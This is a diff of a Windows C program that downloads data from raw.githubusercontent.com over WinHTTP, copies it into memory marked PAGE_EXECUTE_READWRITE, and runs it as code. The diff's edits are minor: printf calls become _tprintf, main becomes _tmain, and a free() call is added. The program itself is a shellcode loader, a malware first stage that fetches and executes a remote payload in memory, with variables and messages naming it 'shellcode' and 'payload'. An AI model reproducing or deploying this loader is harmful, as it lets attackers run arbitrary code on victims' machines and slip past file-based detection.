@@ -1,11 +1,12 @@
 #include <windows.h>
 #include <winhttp.h>
 #include <stdio.h>
+#include <tchar.h>
 
 #pragma comment(lib, "winhttp.lib")
 
 
-int main(void*) {
+int _tmain(void*) {
 
 	DWORD dwSize = 0;
 	DWORD dwDownloaded = 0;
@@ -28,7 +29,7 @@ int main(void*) {
 
 		// Specify the target HTTPS server
 		if (hSession)
-			hConnect = WinHttpConnect(hSession, L"raw.githubusercontent.com",
+			hConnect = WinHttpConnect(hSession, L"raw.githubusercontent.com", 
 				INTERNET_DEFAULT_PORT, 0);
 
 		// Create an HTTP request handle.
@@ -46,7 +47,7 @@ int main(void*) {
 				WINHTTP_NO_REQUEST_DATA, 0,
 				0, 0);
 		if (!bResults) {
-			printf("Error %u in WinHttpSendRequest.\n", GetLastError());
+			_tprintf(L"Error %u in WinHttpSendRequest.\n", GetLastError());
 		}
 		else
 			break;
@@ -64,7 +65,7 @@ int main(void*) {
 			dwSize = 0;
 			if (!WinHttpQueryDataAvailable(hRequest, &dwSize))
 			{
-				printf("Error %u in WinHttpQueryDataAvailable.\n", GetLastError());
+				_tprintf(L"Error %u in WinHttpQueryDataAvailable.\n", GetLastError());
 				break;
 			}
 
@@ -72,7 +73,7 @@ int main(void*) {
 			pszOutBuffer = (LPSTR)malloc(dwSize + 1);
 			if (!pszOutBuffer)
 			{
-				printf("Out of memory\n");
+				_tprintf(L"Out of memory\n");
 				break;
 			}
 
@@ -80,7 +81,7 @@ int main(void*) {
 			// Read the data.
 			if (!WinHttpReadData(hRequest, (LPVOID)pszOutBuffer, dwSize, &dwDownloaded))
 			{
-				printf("Error %u in WinHttpReadData.\n", GetLastError());
+				_tprintf(L"Error %u in WinHttpReadData.\n", GetLastError());
 				free(pszOutBuffer);
 				break;
 			}
@@ -91,7 +92,7 @@ int main(void*) {
 				if (!chunk) {
 					free(shellcode);
 					free(pszOutBuffer);
-					printf("Memory allocation failed\n");
+					_tprintf(L"Memory allocation failed\n");
 					exit(1);
 				}
 				shellcode = chunk;
@@ -107,18 +108,19 @@ int main(void*) {
 		// Allocate executable memory
 		void* execMem = VirtualAlloc(NULL, totalSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
 		if (execMem == NULL) {
-			printf("VirtualAlloc failed with error %u\n", GetLastError());
+			_tprintf(L"VirtualAlloc failed with error %u\n", GetLastError());
 			free(shellcode);
 			exit(1);
 		}
 		memcpy(execMem, shellcode, totalSize);
+		free(shellcode);
 		// Define function pointer to that memory
 		void (*func)() = (void(*)())execMem;
 		__try {
 			func();
 		}
 		__except (EXCEPTION_EXECUTE_HANDLER) {
-			printf("Payload caused an exception!\n");
+			_tprintf(L"Payload caused an exception!\n");
 		}
 	}
 	if (hRequest) WinHttpCloseHandle(hRequest);
